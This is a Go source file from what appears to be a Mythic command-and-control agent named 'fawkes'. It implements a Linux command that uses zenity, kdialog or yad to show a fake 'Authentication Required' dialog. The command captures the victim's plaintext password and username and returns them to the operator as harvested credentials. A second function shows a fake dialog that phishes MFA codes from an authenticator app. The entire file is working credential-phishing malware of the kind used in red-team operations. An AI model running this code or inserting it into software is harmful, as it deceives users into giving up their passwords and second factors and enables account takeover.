//go:build linux

package commands

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// CredentialPromptCommand displays a native Linux credential dialog to harvest user credentials.
type CredentialPromptCommand struct{}

func (c *CredentialPromptCommand) Name() string {
	return "credential-prompt"
}

func (c *CredentialPromptCommand) Description() string {
	return "Display a native GUI credential dialog to capture user credentials (T1056.002)"
}

type credentialPromptLinuxArgs struct {
	Title   string `json:"title"`
	Message string `json:"message"`
}

// credPromptLinuxTimeout is the max time to wait for user interaction.
const credPromptLinuxTimeout = 5 * time.Minute

// findDialogTool returns the path to the first available GUI dialog tool.
// Preference order: zenity (GNOME), kdialog (KDE), yad (GTK alternative).
func findDialogTool() (string, string) {
	for _, tool := range []string{"zenity", "kdialog", "yad"} {
		if path, err := exec.LookPath(tool); err == nil {
			return tool, path
		}
	}
	return "", ""
}

// buildDialogArgs constructs the command arguments for the detected dialog tool.
func buildDialogArgs(tool, title, message string) []string {
	switch tool {
	case "zenity":
		return []string{"--entry", "--title=" + title, "--text=" + message, "--hide-text"}
	case "kdialog":
		return []string{"--password", message, "--title", title}
	case "yad":
		return []string{"--entry", "--title=" + title, "--text=" + message, "--hide-text"}
	default:
		return nil
	}
}

func (c *CredentialPromptCommand) Execute(task structs.Task) structs.CommandResult {
	// Check for cross-platform MFA actions before platform-specific dialog
	action := credPromptExtractAction(task.Params)
	if action == "device-code" || action == "mfa-fatigue" {
		return credPromptDeviceCodeFlow(task)
	}
	if action == "mfa-phish" {
		return credPromptMFAPhishLinux(task)
	}

	args, parseErr := unmarshalParams[credentialPromptLinuxArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	title := args.Title
	if title == "" {
		title = "Authentication Required"
	}
	message := args.Message
	if message == "" {
		message = "Enter your password to continue."
	}

	// Check for display server — GUI dialogs need X11 or Wayland
	if os.Getenv("DISPLAY") == "" && os.Getenv("WAYLAND_DISPLAY") == "" {
		return errorResult("No display server available (DISPLAY and WAYLAND_DISPLAY unset). GUI credential dialog requires a desktop session.")
	}

	tool, toolPath := findDialogTool()
	if toolPath == "" {
		return errorResult("No GUI dialog tool found. Install zenity (GNOME), kdialog (KDE), or yad.")
	}

	dialogArgs := buildDialogArgs(tool, title, message)

	ctx, cancel := context.WithTimeout(context.Background(), credPromptLinuxTimeout)
	defer cancel()

	out, err := exec.CommandContext(ctx, toolPath, dialogArgs...).CombinedOutput()
	defer structs.ZeroBytes(out)
	if err != nil {
		// Exit code 1 = user cancelled for zenity/yad, exit code 1 for kdialog cancel
		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
			return successResult("User cancelled the dialog")
		}
		return errorf("Dialog failed: %v\n%s", err, strings.TrimSpace(string(out)))
	}

	password := strings.TrimSpace(string(out))
	defer structs.ZeroString(&password)
	if password == "" {
		return successResult("User submitted empty password")
	}

	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	var sb strings.Builder
	sb.WriteString("=== Credential Prompt Result ===\n\n")
	sb.WriteString(fmt.Sprintf("User:     %s\n", username))
	sb.WriteString(fmt.Sprintf("Password: %s\n", password))
	sb.WriteString(fmt.Sprintf("Dialog:   %s (%s)\n", title, tool))

	creds := []structs.MythicCredential{
		{
			CredentialType: "plaintext",
			Realm:          "local",
			Account:        username,
			Credential:     password,
			Comment:        fmt.Sprintf("credential-prompt dialog (%s)", tool),
		},
	}

	return structs.CommandResult{
		Output:      sb.String(),
		Status:      "success",
		Completed:   true,
		Credentials: &creds,
	}
}

// buildMFADialogArgs constructs the command arguments for an MFA phishing
// dialog using the detected dialog tool. Unlike credential dialogs, MFA
// dialogs use VISIBLE text fields (not hidden) since MFA codes are visible.
func buildMFADialogArgs(tool, title, message string) []string {
	switch tool {
	case "zenity":
		return []string{"--entry", "--title=" + title, "--text=" + message}
	case "kdialog":
		return []string{"--inputbox", message, "", "--title", title}
	case "yad":
		return []string{"--entry", "--title=" + title, "--text=" + message}
	default:
		return nil
	}
}

// credPromptMFAPhishLinux displays an MFA phishing dialog on Linux using
// zenity/kdialog/yad with a visible text entry field for MFA code capture.
func credPromptMFAPhishLinux(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[credentialPromptLinuxArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	title := args.Title
	if title == "" {
		title = "Verify Your Identity"
	}
	message := args.Message
	if message == "" {
		message = "Enter the verification code from your authenticator app."
	}

	if os.Getenv("DISPLAY") == "" && os.Getenv("WAYLAND_DISPLAY") == "" {
		return errorResult("No display server available. MFA phishing dialog requires a desktop session.")
	}

	tool, toolPath := findDialogTool()
	if toolPath == "" {
		return errorResult("No GUI dialog tool found. Install zenity, kdialog, or yad.")
	}

	dialogArgs := buildMFADialogArgs(tool, title, message)

	ctx, cancel := context.WithTimeout(context.Background(), credPromptLinuxTimeout)
	defer cancel()

	out, err := exec.CommandContext(ctx, toolPath, dialogArgs...).CombinedOutput()
	defer structs.ZeroBytes(out)
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
			return successResult("User cancelled the MFA dialog")
		}
		return errorf("MFA dialog failed: %v\n%s", err, strings.TrimSpace(string(out)))
	}

	code := strings.TrimSpace(string(out))

	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	return credPromptMFAPhishResult(code, title, username, "Linux")
}
